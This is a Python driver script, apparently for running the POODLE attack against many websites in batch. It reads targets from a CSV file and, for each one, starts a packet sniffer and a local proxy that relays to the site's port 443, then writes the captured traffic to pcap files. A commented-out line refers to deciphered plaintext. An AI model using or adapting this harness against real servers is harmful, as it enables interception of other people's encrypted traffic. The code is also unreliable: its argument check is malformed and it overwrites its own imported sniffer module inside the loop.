import socketserver

from scapy.all import *

import proxy_server
import sniffer

if __name__ == '__main__':
    output_prefix = "output"
    if len(sys.argv) < 2:
        print("Usage: python poodle-exploit-multiple.py <output>, using default output folder")
    elif len(sys.argv == 2):
        output_prefix = str(sys.argv[1])
    else:
        exit()

    content = ""
    with open('ip-domain.csv', 'r') as content_file:
        content = content_file.read()

    websites = content.split("\n")

    i = 0
    failedWebsites = []
    server_domain = "no-such-domain-exists-ignore-no-match-1clwishoawchneowahemlwaouxmoluqxhwaq88hwxn"
    while i < len(websites):
        websiteData = websites[i].split(",")
        print("Beginning with website: " + websiteData[0] + ", domain: " + websiteData[1] + ", IP: " + websiteData[2])

        previous_domain = server_domain
        server_domain = websiteData[1]
        server_ip = websiteData[2]
        server_port = 443

        sniffer = sniffer.Sniffer(server_ip)

        sniffer.start()

        # rows, columns = os.popen('stty size', 'r').read().split()
        rows = 50
        columns = 80
        # Create server and bind to set ip
        socketserver.TCPServer.allow_reuse_address = True

        # httpd = socketserver.TCPServer(("127.0.0.1", 9999), MyTCPHandler)
        proxy_server.ProxyTCPHandler.set_configurations(server_ip, server_port, server_domain, previous_domain)
        httpd = socketserver.TCPServer(("127.0.0.1", 9999), proxy_server.ProxyTCPHandler)
        proxy = threading.Thread(target=httpd.serve_forever)
        proxy.daemon = True
        proxy.start()
        # time.sleep(5)

        print('Passive mode enabled by default')
        print("Starting in search mode...")

        sniffer_capture = False
        start_time = time.time()
        while True:
            try:
                time.sleep(1)
                sys.stdout.flush()
                if hasattr(sniffer, 'capture'):
                    if not sniffer_capture and hasattr(sniffer, 'capture'):
                        sniffer_capture = True
                    break
            except KeyboardInterrupt:
                print("Exiting...")
                print("Stopping proxy... bye bye")
                print("Failures: ")
                print(failedWebsites)
                exit()

        # print("\n\033[32m{-} Deciphered plaintext\033[0m :", ('').join(poodle.secret))

        print("Stop sniffing...")
        sniffer.join(5.0)
        time.sleep(10)

        if not os.path.exists(output_prefix):
            os.makedirs(output_prefix)

        if hasattr(sniffer, 'capture'):
            filename = os.path.join(output_prefix, websiteData[1] + "_" + datetime.datetime.now().strftime(
                "%Y-%m-%d_%H-%M-%S") + ".pcap")

            wrpcap(filename, sniffer.capture)

            if sniffer.isAlive():
                sniffer.socket.close()

        else:
            print("Failure: sniffer does not have capture property for " + websiteData[0] + " Skipping...")
            if sniffer_capture:
                print("Hmmm?")
            failedWebsites.append(websiteData[0])

        i = i + 1

    print("Done. The following websites lacked capture property: ")
    print(failedWebsites)

    with open("poodle-exploit-multiple-failed_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".csv",
              'a+') as f:
        for i in range(0, len(failedWebsites)):
            f.write(failedWebsites[i]);
